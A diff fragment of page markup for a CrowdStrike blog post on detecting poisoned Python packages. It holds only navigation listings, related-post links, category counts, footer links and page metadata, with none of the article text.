+      "children" : "[{\"pageTitle\":\"CrowdStrike Threat Hunts for Shell Command Obfuscation on VMware ESX\",\"publishDate\":\"08/07/26\",\"pageThumbnail\":\"https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-EMBER2024?wid\\u003d1060\\u0026hei\\u003d698\\u0026fmt\\u003dpng-alpha\\u0026qlt\\u003d95,0\\u0026resMode\\u003dsharp2\\u0026op_usm\\u003d3.0,0.3,2,0\",\"url\":\"/content/crowdstrike-www/locale-sites/us/en-us/blog/crowdstrike-hunts-for-shell-command-obfuscation-vmware-esx.html\"},{\"pageTitle\":\"Falcon Platform IOAs Arrive in Falcon Next-Gen SIEM to Identify New Threats\",\"publishDate\":\"07/29/26\",\"pageThumbnail\":\"https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-FalconPlatformIOA?wid\\u003d1060\\u0026hei\\u003d698\\u0026fmt\\u003dpng-alpha\\u0026qlt\\u003d95,0\\u0026resMode\\u003dsharp2\\u0026op_usm\\u003d3.0,0.3,2,0\",\"url\":\"/content/crowdstrike-www/locale-sites/us/en-us/blog/falcon-platform-ioas-arrive-in-falcon-next-gen-siem.html\"},{\"pageTitle\":\"5 High-Impact Use Cases for Falcon Onum\",\"publishDate\":\"07/27/26\",\"pageThumbnail\":\"https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-Onum-Lines?wid\\u003d1060\\u0026hei\\u003d698\\u0026fmt\\u003dpng-alpha\\u0026qlt\\u003d95,0\\u0026resMode\\u003dsharp2\\u0026op_usm\\u003d3.0,0.3,2,0\",\"url\":\"/content/crowdstrike-www/locale-sites/us/en-us/blog/five-high-impact-use-cases-for-falcon-onum.html\"},{\"pageTitle\":\"Falcon Next-Gen SIEM Supports Third-Party EDR Tools, Starting with Microsoft Defender\",\"publishDate\":\"03/23/26\",\"pageThumbnail\":\"https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-NGS-Exponential?wid\\u003d1060\\u0026hei\\u003d698\\u0026fmt\\u003dpng-alpha\\u0026qlt\\u003d95,0\\u0026resMode\\u003dsharp2\\u0026op_usm\\u003d3.0,0.3,2,0\",\"url\":\"/content/crowdstrike-www/locale-sites/us/en-us/blog/falcon-next-gen-siem-supports-third-party-edr-tools-starting-with-microsoft-defender.html\"}]",
+      "title" : "Next-Gen SIEM & Log Management",
+      "categoryLink" : "/content/crowdstrike-www/locale-sites/us/en-us/blog/category.observability-and-log-management.html"
+    }, {
+      "children" : "[{\"pageTitle\":\"CrowdStrike Falcon Platform Helps Meet U.S. Government Mandates for CISA BOD-26-04 \",\"publishDate\":\"07/22/26\",\"pageThumbnail\":\"https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-Gov-Scroll?wid\\u003d1060\\u0026hei\\u003d698\\u0026fmt\\u003dpng-alpha\\u0026qlt\\u003d95,0\\u0026resMode\\u003dsharp2\\u0026op_usm\\u003d3.0,0.3,2,0\",\"url\":\"/content/crowdstrike-www/locale-sites/us/en-us/blog/crowdstrike-falcon-platform-helps-meet-us-government-mandates-cisa-bod-26-04.html\"},{\"pageTitle\":\"CrowdStrike Innovates to Modernize National Security and Protect Critical Systems \",\"publishDate\":\"03/18/26\",\"pageThumbnail\":\"https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-FalConGov-Roundup?wid\\u003d1060\\u0026hei\\u003d698\\u0026fmt\\u003dpng-alpha\\u0026qlt\\u003d95,0\\u0026resMode\\u003dsharp2\\u0026op_usm\\u003d3.0,0.3,2,0\",\"url\":\"/content/crowdstrike-www/locale-sites/us/en-us/blog/crowdstrike-innovates-to-modernize-national-security-and-protect-critical-systems.html\"},{\"pageTitle\":\"Falcon Platform for Government Now Offers Falcon for XIoT to Secure Connected Assets \",\"publishDate\":\"03/18/26\",\"pageThumbnail\":\"https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-FalConGov-XIoT?wid\\u003d1060\\u0026hei\\u003d698\\u0026fmt\\u003dpng-alpha\\u0026qlt\\u003d95,0\\u0026resMode\\u003dsharp2\\u0026op_usm\\u003d3.0,0.3,2,0\",\"url\":\"/content/crowdstrike-www/locale-sites/us/en-us/blog/falcon-platform-for-government-now-offers-falcon-for-xiot-to-secure-connected-assets.html\"},{\"pageTitle\":\"CrowdStrike Achieves FedRAMP® High Authorization\",\"publishDate\":\"03/19/25\",\"pageThumbnail\":\"https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-image-for-Fed-Gov-1?wid\\u003d1060\\u0026hei\\u003d698\\u0026fmt\\u003dpng-alpha\\u0026qlt\\u003d95,0\\u0026resMode\\u003dsharp2\\u0026op_usm\\u003d3.0,0.3,2,0\",\"url\":\"/content/crowdstrike-www/locale-sites/us/en-us/blog/crowdstrike-achieves-fedramp-high-authorization.html\"}]",
+      "title" : "Public Sector",
+      "categoryLink" : "/content/crowdstrike-www/locale-sites/us/en-us/blog/category.public-sector.html"
+    }, {
+      "children" : "[{\"pageTitle\":\"July 2026 Patch Tuesday: Microsoft Patches 622 Vulnerabilities Including Two Exploited Zero-Days\",\"publishDate\":\"07/14/26\",\"pageThumbnail\":\"https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-PT-2025?wid\\u003d1060\\u0026hei\\u003d698\\u0026fmt\\u003dpng-alpha\\u0026qlt\\u003d95,0\\u0026resMode\\u003dsharp2\\u0026op_usm\\u003d3.0,0.3,2,0\",\"url\":\"/content/crowdstrike-www/locale-sites/us/en-us/blog/patch-tuesday-analysis-july-2026.html\"},{\"pageTitle\":\"Falcon Exposure Management Now Available for Third-Party Environments\",\"publishDate\":\"06/16/26\",\"pageThumbnail\":\"https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-MagnifyingGlass?wid\\u003d1060\\u0026hei\\u003d698\\u0026fmt\\u003dpng-alpha\\u0026qlt\\u003d95,0\\u0026resMode\\u003dsharp2\\u0026op_usm\\u003d3.0,0.3,2,0\",\"url\":\"/content/crowdstrike-www/locale-sites/us/en-us/blog/falcon-exposure-management-now-available-for-third-party-environments.html\"},{\"pageTitle\":\"June 2026 Patch Tuesday: Microsoft Patches 206 Vulnerabilities Including Three Publicly Disclosed Zero-Days \",\"publishDate\":\"06/09/26\",\"pageThumbnail\":\"https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-PT-2025?wid\\u003d1060\\u0026hei\\u003d698\\u0026fmt\\u003dpng-alpha\\u0026qlt\\u003d95,0\\u0026resMode\\u003dsharp2\\u0026op_usm\\u003d3.0,0.3,2,0\",\"url\":\"/content/crowdstrike-www/locale-sites/us/en-us/blog/patch-tuesday-analysis-june-2026.html\"},{\"pageTitle\":\"May 2026 Patch Tuesday: 30 Critical Vulnerabilities Among 130 CVEs\",\"publishDate\":\"05/12/26\",\"pageThumbnail\":\"https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-PT-2025?wid\\u003d1060\\u0026hei\\u003d698\\u0026fmt\\u003dpng-alpha\\u0026qlt\\u003d95,0\\u0026resMode\\u003dsharp2\\u0026op_usm\\u003d3.0,0.3,2,0\",\"url\":\"/content/crowdstrike-www/locale-sites/us/en-us/blog/patch-tuesday-analysis-may-2026.html\"}]",
+      "title" : "Exposure Management",
+      "categoryLink" : "/content/crowdstrike-www/locale-sites/us/en-us/blog/category.exposure-management.html"
+    }, {
+      "children" : "[{\"pageTitle\":\"Expanding AI Benchmarks in Cybersecurity Beyond Vulnerability Discovery\",\"publishDate\":\"08/06/26\",\"pageThumbnail\":\"https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-Personalized-Threat-Intel (1)?wid\\u003d2048\\u0026hei\\u003d1350\\u0026fmt\\u003dpng-alpha\\u0026qlt\\u003d95,0\\u0026resMode\\u003dsharp2\\u0026op_usm\\u003d3.0,0.3,2,0\",\"url\":\"/content/crowdstrike-www/locale-sites/us/en-us/blog/expanding-cybersecurity-ai-benchmarks-beyond-vulnerability-discovery.html\"},{\"pageTitle\":\"Secure Agent Harness Execution: Preventing Escape\",\"publishDate\":\"08/04/26\",\"pageThumbnail\":\"https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-TrainingGenAI?wid\\u003d1060\\u0026hei\\u003d698\\u0026fmt\\u003dpng-alpha\\u0026qlt\\u003d95,0\\u0026resMode\\u003dsharp2\\u0026op_usm\\u003d3.0,0.3,2,0\",\"url\":\"/content/crowdstrike-www/locale-sites/us/en-us/blog/secure-agent-harness-execution-preventing-escape.html\"},{\"pageTitle\":\"Falcon AIDR Now Protects Copilot Studio Agents and Claude Code\",\"publishDate\":\"07/30/26\",\"pageThumbnail\":\"https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-AIDR-Protection?wid\\u003d2048\\u0026hei\\u003d1349\\u0026fmt\\u003dpng-alpha\\u0026qlt\\u003d95,0\\u0026resMode\\u003dsharp2\\u0026op_usm\\u003d3.0,0.3,2,0\",\"url\":\"/content/crowdstrike-www/locale-sites/us/en-us/blog/falcon-aidr-protects-copilot-studio-agents-and-claude-code.html\"},{\"pageTitle\":\"CrowdStrike Joins the Open Secure AI Alliance to Advance AI Safety and Security\",\"publishDate\":\"07/27/26\",\"pageThumbnail\":\"https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-AWS-NVIDIA?wid\\u003d1060\\u0026hei\\u003d698\\u0026fmt\\u003dpng-alpha\\u0026qlt\\u003d95,0\\u0026resMode\\u003dsharp2\\u0026op_usm\\u003d3.0,0.3,2,0\",\"url\":\"/content/crowdstrike-www/locale-sites/us/en-us/blog/crowdstrike-joins-the-open-secure-ai-alliance.html\"}]",
+      "title" : "Securing AI",
+      "categoryLink" : "/content/crowdstrike-www/locale-sites/us/en-us/blog/category.securing-ai.html"
+    }, {
+      "children" : "[{\"pageTitle\":\"ISO 42001:2023 and the New Reality of Cloud AI Data Risk\",\"publishDate\":\"06/04/26\",\"pageThumbnail\":\"https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-Data-Protection-Day-2026?wid\\u003d1060\\u0026hei\\u003d698\\u0026fmt\\u003dpng-alpha\\u0026qlt\\u003d95,0\\u0026resMode\\u003dsharp2\\u0026op_usm\\u003d3.0,0.3,2,0\",\"url\":\"/content/crowdstrike-www/locale-sites/us/en-us/blog/iso-42001-2023-and-new-reality-of-cloud-ai-data-risk.html\"},{\"pageTitle\":\"Falcon Data Security Secures Data Wherever It Lives and Moves\",\"publishDate\":\"03/24/26\",\"pageThumbnail\":\"https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-Strengthen-Data-Security?wid\\u003d1060\\u0026hei\\u003d698\\u0026fmt\\u003dpng-alpha\\u0026qlt\\u003d95,0\\u0026resMode\\u003dsharp2\\u0026op_usm\\u003d3.0,0.3,2,0\",\"url\":\"/content/crowdstrike-www/locale-sites/us/en-us/blog/falcon-data-security-secures-data-wherever-it-lives-and-moves.html\"},{\"pageTitle\":\"Falcon Data Protection for Cloud Extends DSPM into Runtime\",\"publishDate\":\"11/20/25\",\"pageThumbnail\":\"https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-FalconDataProtectionCloud?wid\\u003d1060\\u0026hei\\u003d698\\u0026fmt\\u003dpng-alpha\\u0026qlt\\u003d95,0\\u0026resMode\\u003dsharp2\\u0026op_usm\\u003d3.0,0.3,2,0\",\"url\":\"/content/crowdstrike-www/locale-sites/us/en-us/blog/falcon-data-protection-for-cloud-extends-dspm-into-runtime.html\"},{\"pageTitle\":\"CrowdStrike Stops GenAI Data Leaks with Unified Data Protection\",\"publishDate\":\"09/18/25\",\"pageThumbnail\":\"https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-FalCon25-StopGenAILeaks-FalconDataProtection-Thurs?wid\\u003d1060\\u0026hei\\u003d698\\u0026fmt\\u003dpng-alpha\\u0026qlt\\u003d95,0\\u0026resMode\\u003dsharp2\\u0026op_usm\\u003d3.0,0.3,2,0\",\"url\":\"/content/crowdstrike-www/locale-sites/us/en-us/blog/crowdstrike-stops-genai-data-leaks-with-unified-data-protection.html\"}]",
+      "title" : "Data Security",
+      "categoryLink" : "/content/crowdstrike-www/locale-sites/us/en-us/blog/category.data-security.html"
+    }, {
+      "pageTitle" : "CrowdStrike Threat Hunts for Shell Command Obfuscation on VMware ESX",
+      "publishDate" : "Aug 07, 2026",
+      "pageThumbnail" : "https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-EMBER2024?wid=1060&hei=698&fmt=png-alpha&qlt=95,0&resMode=sharp2&op_usm=3.0,0.3,2,0",
+      "url" : "/content/crowdstrike-www/locale-sites/us/en-us/blog/crowdstrike-hunts-for-shell-command-obfuscation-vmware-esx.html"
+    }, {
+      "pageTitle" : "Expanding AI Benchmarks in Cybersecurity Beyond Vulnerability Discovery",
+      "publishDate" : "Aug 06, 2026",
+      "pageThumbnail" : "https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-Personalized-Threat-Intel (1)?wid=2048&hei=1350&fmt=png-alpha&qlt=95,0&resMode=sharp2&op_usm=3.0,0.3,2,0",
+      "url" : "/content/crowdstrike-www/locale-sites/us/en-us/blog/expanding-cybersecurity-ai-benchmarks-beyond-vulnerability-discovery.html"
+    }, {
+      "pageTitle" : "Secure Agent Harness Execution: Preventing Escape",
+      "publishDate" : "Aug 04, 2026",
+      "pageThumbnail" : "https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-TrainingGenAI?wid=1060&hei=698&fmt=png-alpha&qlt=95,0&resMode=sharp2&op_usm=3.0,0.3,2,0",
+      "url" : "/content/crowdstrike-www/locale-sites/us/en-us/blog/secure-agent-harness-execution-preventing-escape.html"
+    }, {
+      "pageTitle" : "CrowdStrike 2026 Threat Hunting Report: Exploitation Window Closes as AI Use Accelerates",
+      "publishDate" : "Aug 03, 2026",
+      "pageThumbnail" : "https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-THR-2026?wid=1060&hei=698&fmt=png-alpha&qlt=95,0&resMode=sharp2&op_usm=3.0,0.3,2,0",
+      "url" : "/content/crowdstrike-www/locale-sites/us/en-us/blog/crowdstrike-2026-threat-hunting-report.html"
+    }, {
+      "pageTitle" : "CrowdStrike Threat Hunts for Shell Command Obfuscation on VMware ESX",
+      "publishDate" : "Aug 07, 2026",
+      "pageThumbnail" : "https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-EMBER2024?wid=1060&hei=698&fmt=png-alpha&qlt=95,0&resMode=sharp2&op_usm=3.0,0.3,2,0",
+      "url" : "/content/crowdstrike-www/locale-sites/us/en-us/blog/crowdstrike-hunts-for-shell-command-obfuscation-vmware-esx.html"
+    }, {
+      "pageTitle" : "Expanding AI Benchmarks in Cybersecurity Beyond Vulnerability Discovery",
+      "publishDate" : "Aug 06, 2026",
+      "pageThumbnail" : "https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-Personalized-Threat-Intel (1)?wid=2048&hei=1350&fmt=png-alpha&qlt=95,0&resMode=sharp2&op_usm=3.0,0.3,2,0",
+      "url" : "/content/crowdstrike-www/locale-sites/us/en-us/blog/expanding-cybersecurity-ai-benchmarks-beyond-vulnerability-discovery.html"
+    }, {
+      "pageTitle" : "Secure Agent Harness Execution: Preventing Escape",
+      "publishDate" : "Aug 04, 2026",
+      "pageThumbnail" : "https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-TrainingGenAI?wid=1060&hei=698&fmt=png-alpha&qlt=95,0&resMode=sharp2&op_usm=3.0,0.3,2,0",
+      "url" : "/content/crowdstrike-www/locale-sites/us/en-us/blog/secure-agent-harness-execution-preventing-escape.html"
+    }, {
+      "pageTitle" : "CrowdStrike 2026 Threat Hunting Report: Exploitation Window Closes as AI Use Accelerates",
+      "publishDate" : "Aug 03, 2026",
+      "pageThumbnail" : "https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-THR-2026?wid=1060&hei=698&fmt=png-alpha&qlt=95,0&resMode=sharp2&op_usm=3.0,0.3,2,0",
+      "url" : "/content/crowdstrike-www/locale-sites/us/en-us/blog/crowdstrike-2026-threat-hunting-report.html"
+    } ],
+    "componentInfo" : { },
+    "id" : "navigation-en-us",
+    "featuredLabel" : "Featured",
+    "videoPagePath" : "/content/crowdstrike-www/locale-sites/us/en-us/blog/videos.html",
+    "freeTrialPagePath" : "https://www.crowdstrike.com/products/trials/try-falcon-prevent"
+  }, {
+    "pageTitle" : "Detecting Poisoned Python Packages: CTX and PHPass",
+    "author" : "Manoj Ahuje",
+    "publishDate" : "June 03, 2022",
+    "componentInfo" : { },
+    "authorLink" : "/content/crowdstrike-www/locale-sites/us/en-us/blog/author.manoj-ahuje.html",
+    "id" : "headline-en-us",
+    "categories" : "Cloud & Application Security",
+    "categoryLink" : "/content/crowdstrike-www/locale-sites/us/en-us/blog/category.cloud-security.html",
+    "pageThumbnail" : "https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog_1060x698-5-3?wid=1060&hei=698&fmt=png-alpha&qlt=95,0&resMode=sharp2&op_usm=3.0,0.3,2,0"
+  }, {
+    "linkedInUrl" : "https://www.linkedin.com/shareArticle",
+    "twitterUrl" : "https://twitter.com/share",
+    "componentInfo" : { }
+  }, {
+    "relatedContentLabel" : "Related Content",
+    "children" : [ {
+      "pageTitle" : "Falcon Cloud Security July 2026 Release: Helping Security Teams Move Faster in the Cloud",
+      "id" : "relatedcontent-en-us",
+      "pageThumbnail" : "https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-FCS-July26?wid=2048&hei=1365&fmt=png-alpha&qlt=95,0&resMode=sharp2&op_usm=3.0,0.3,2,0",
+      "url" : "/content/crowdstrike-www/locale-sites/us/en-us/blog/new-in-falcon-cloud-security-helping-security-teams-move-faster.html"
+    }, {
+      "pageTitle" : "Falcon Cloud Security June 2026 Release: Updates for Azure and Google Cloud",
+      "id" : "relatedcontent-en-us",
+      "pageThumbnail" : "https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-Cloud-Puzzle-Tech?wid=2048&hei=1349&fmt=png-alpha&qlt=95,0&resMode=sharp2&op_usm=3.0,0.3,2,0",
+      "url" : "/content/crowdstrike-www/locale-sites/us/en-us/blog/new-in-falcon-cloud-security-expanding-multi-cloud-coverage.html"
+    }, {
+      "pageTitle" : "94% of Organizations Report Cloud Breaches: CrowdStrike State of CDR Survey",
+      "id" : "relatedcontent-en-us",
+      "pageThumbnail" : "https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-CDRSurvey?wid=1060&hei=698&fmt=png-alpha&qlt=95,0&resMode=sharp2&op_usm=3.0,0.3,2,0",
+      "url" : "/content/crowdstrike-www/locale-sites/us/en-us/blog/crowdstrike-state-of-cdr-survey-key-takeaways.html"
+    } ],
+    "componentInfo" : { },
+    "id" : "relatedcontent-en-us"
+  }, {
+    "children" : [ {
+      "count" : "53",
+      "title" : "Agentic SOC",
+      "categoryLink" : "/content/crowdstrike-www/locale-sites/us/en-us/blog/category.ai-machine-learning.html"
+    }, {
+      "count" : "148",
+      "title" : "Cloud & Application Security",
+      "categoryLink" : "/content/crowdstrike-www/locale-sites/us/en-us/blog/category.cloud-security.html"
+    }, {
+      "count" : "25",
+      "title" : "Data Security",
+      "categoryLink" : "/content/crowdstrike-www/locale-sites/us/en-us/blog/category.data-security.html"
+    }, {
+      "count" : "361",
+      "title" : "Endpoint Security & XDR",
+      "categoryLink" : "/content/crowdstrike-www/locale-sites/us/en-us/blog/category.endpoint-protection.html"
+    }, {
+      "count" : "87",
+      "title" : "Engineering & Tech",
+      "categoryLink" : "/content/crowdstrike-www/locale-sites/us/en-us/blog/category.engineering-and-technology.html"
+    }, {
+      "count" : "181",
+      "title" : "Executive Viewpoint",
+      "categoryLink" : "/content/crowdstrike-www/locale-sites/us/en-us/blog/category.executive-viewpoint.html"
+    }, {
+      "count" : "123",
+      "title" : "Exposure Management",
+      "categoryLink" : "/content/crowdstrike-www/locale-sites/us/en-us/blog/category.exposure-management.html"
+    }, {
+      "count" : "205",
+      "title" : "From The Front Lines",
+      "categoryLink" : "/content/crowdstrike-www/locale-sites/us/en-us/blog/category.from-the-front-lines.html"
+    }, {
+      "count" : "74",
+      "title" : "Next-Gen Identity Security",
+      "categoryLink" : "/content/crowdstrike-www/locale-sites/us/en-us/blog/category.identity-protection.html"
+    }, {
+      "count" : "116",
+      "title" : "Next-Gen SIEM & Log Management",
+      "categoryLink" : "/content/crowdstrike-www/locale-sites/us/en-us/blog/category.observability-and-log-management.html"
+    }, {
+      "count" : "43",
+      "title" : "Public Sector",
+      "categoryLink" : "/content/crowdstrike-www/locale-sites/us/en-us/blog/category.public-sector.html"
+    }, {
+      "count" : "49",
+      "title" : "Securing AI",
+      "categoryLink" : "/content/crowdstrike-www/locale-sites/us/en-us/blog/category.securing-ai.html"
+    }, {
+      "count" : "221",
+      "title" : "Threat Hunting & Intel",
+      "categoryLink" : "/content/crowdstrike-www/locale-sites/us/en-us/blog/category.counter-adversary-operations.html"
+    } ],
+    "categoryLabel" : "Categories",
+    "componentInfo" : { },
+    "id" : "categories-en-us"
+  }, {
+    "componentInfo" : { },
+    "id" : "logo-en-us",
+    "fileReference" : "https://assets.crowdstrike.com/is/content/crowdstrikeinc/black-crowdstrike-logo-footer",
+    "thumbnailImagePath" : "/content/dam/crowdstrike/common/brand/english/company-logos/black-crowdstrike-logo-footer.svg/jcr:content/renditions/cq5dam.thumbnail.319.319.png",
+    "url" : "https://www.crowdstrike.com/en-us/"
+  }, {
+    "linkedInUrl" : "https://www.linkedin.com/company/crowdstrike",
+    "youtubeUrl" : "http://www.youtube.com/user/CrowdStrike",
+    "twitterUrl" : "https://x.com/CrowdStrike",
+    "componentInfo" : { }
+  }, {
+    "children" : [ {
+      "externalLink" : "\"false\"",
+      "id" : "list-en-us",
+      "text" : "Copyright © 2026 CrowdStrike"
+    }, {
+      "externalLink" : "\"false\"",
+      "id" : "list-en-us",
+      "text" : "Privacy",
+      "url" : "https://www.crowdstrike.com/privacy-notice/"
+    }, {
+      "externalLink" : "\"false\"",
+      "id" : "list-en-us",
+      "text" : "Request Info",
+      "url" : "https://www.crowdstrike.com/services/request-information/"
+    }, {
+      "externalLink" : "\"false\"",
+      "id" : "list-en-us",
+      "text" : "Blog",
+      "url" : "https://www.crowdstrike.com/blog/"
+    }, {
+      "externalLink" : "\"false\"",
+      "id" : "list-en-us",
+      "text" : "Contact Us",
+      "url" : "https://www.crowdstrike.com/contact-us/"
+    }, {
+      "externalLink" : "\"false\"",
+      "id" : "list-en-us",
+      "text" : " 1.888.512.8906"
+    }, {
+      "externalLink" : "\"false\"",
+      "id" : "list-en-us",
+      "text" : "Accessibility",
+      "url" : "#"
+    } ],
+    "componentInfo" : { }
+  } ],
+  "version " : "1.0",
+  "page" : {
+    "pageInfo" : {
+      "pageType" : "blog child",
+      "formInfo" : { },
+      "publisher" : "crowdstrike.com",
+      "language" : "en_US",
+      "destinationURL" : "https://www.crowdstrike.com/en-us/blog/how-crowdstrike-detects-poisoned-python-packages-ctx-phpass/",
+      "sysEnv" : "prod",
+      "issueDate" : "2024-09-27T13:29:07Z00",
+      "pageID" : "/content/crowdstrike-www/locale-sites/us/en-us/blog/how-crowdstrike-detects-poisoned-python-packages-ctx-phpass",
+      "pageName" : "Detecting Poisoned Python Packages: CTX and PHPass",
+      "breadcrumbs" : [ "CrowdStrike.com", "Locale Sites", "United States", "CrowdStrike: Definitive AI-native cybersecurity platform", "Blog", "Detecting Poisoned Python Packages: CTX and PHPass" ],
+      "effectiveDate" : "2024-09-27T13:29:07Z00"
+    },
+    "attributes" : {
+      "template" : "crowdstrike-blog-detail-page",
+      "tags" : [ ]
+    },
+    "category" : {
+      "primaryCategory" : "blog child"
+    }
+  },
+  "event" : [ {
+    "eventName" : "Page Load",
+    "eventAction" : "pageLoad"
+  } ]
+}
+    }
+</script>
+</div>
+
+
+    
+
+    
+    
+    
+
+            
+
+        
+        
+    <script type="application/ld+json">{"@context":"https://schema.org","@graph":[{"@id":"https://www.crowdstrike.com/#org","@type":"Organization","logo":{"@type":"ImageObject","contentUrl":"https://www.crowdstrike.com/content/dam/crowdstrike/marketing/en-us/logos/crowdstrike/crowdstrike-logos/CrowdStrike-logo-primary-white.png","url":"https://www.crowdstrike.com/content/dam/crowdstrike/marketing/en-us/logos/crowdstrike/crowdstrike-logos/CrowdStrike-logo-primary-white.png"},"name":"CrowdStrike","sameAs":["https://www.linkedin.com/company/crowdstrike","https://x.com/crowdstrike","https://www.instagram.com/crowdstrike/","https://www.youtube.com/user/crowdstrike"],"url":"https://www.crowdstrike.com"},{"@id":"https://www.crowdstrike.com/en-us/blog/how-crowdstrike-detects-poisoned-python-packages-ctx-phpass/#webpage","@type":"WebPage","about":[{"@type":"Thing","name":"Cloud & Application Security"}],"author":["Manoj Ahuje"],"dateModified":"2025-01-30T19:30Z","inLanguage":"en-US","isPartOf":{"@type":"WebSite","name":"CrowdStrike","publisher":{"@id":"https://www.crowdstrike.com/#org","@type":"Organization"},"url":"https://www.crowdstrike.com/content/crowdstrike-www/locale-sites/us/en-us"},"name":"Detecting Poisoned Python Packages: CTX and PHPass | CrowdStrike","primaryImageOfPage":{"@type":"ImageObject","contentUrl":"https://www.crowdstrike.com/content/dam/crowdstrike/www/en-us/wp/2022/06/Blog_1060x698-5.jpeg","url":"https://www.crowdstrike.com/content/dam/crowdstrike/www/en-us/wp/2022/06/Blog_1060x698-5.jpeg"},"url":"https://www.crowdstrike.com/en-us/blog/how-crowdstrike-detects-poisoned-python-packages-ctx-phpass/"}]}</script>
+    
+
+        
+    </body>
+</html>
